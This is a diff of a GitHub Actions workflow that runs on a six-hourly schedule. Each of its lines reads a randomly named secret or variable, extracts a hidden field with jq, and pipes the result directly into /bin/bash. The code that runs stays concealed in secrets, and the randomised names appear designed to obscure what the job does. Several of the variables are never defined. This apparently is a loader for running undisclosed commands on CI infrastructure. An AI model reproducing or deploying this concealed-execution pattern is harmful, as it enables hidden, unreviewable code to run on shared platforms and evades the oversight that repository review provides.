@@ -2,19 +2,23 @@ name: caijingcheng0987
 on:
   workflow_dispatch:
   schedule:
-    - cron: '6 5/6 * * *'
+    - cron: '46 2/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: caijingcheng0987
         env:
-          k54258: ${{ secrets.k54258 }}
+          s49106: ${{ secrets.s49106 }}
         run: |
-          echo $k54258 | jq -r .smz76 | /bin/bash
-          echo $ytzj85 | jq -r .y0205 | /bin/bash
-          echo $qdfs3 | jq -r .ylqwt655 | /bin/bash
-          echo $ideus20266 | jq -r .c54 | /bin/bash
+          echo $s49106 | jq -r .nyqoz7 | /bin/bash
+          echo $bh28 | jq -r .xfb6 | /bin/bash
+          echo $bod8 | jq -r .vn465 | /bin/bash
+          echo $w4 | jq -r .uay1997 | /bin/bash
+          echo $qqin08 | jq -r .zls7 | /bin/bash
+          echo $k1484 | jq -r .tbem68 | /bin/bash
+          echo $e2 | jq -r .cbzc229 | /bin/bash
 
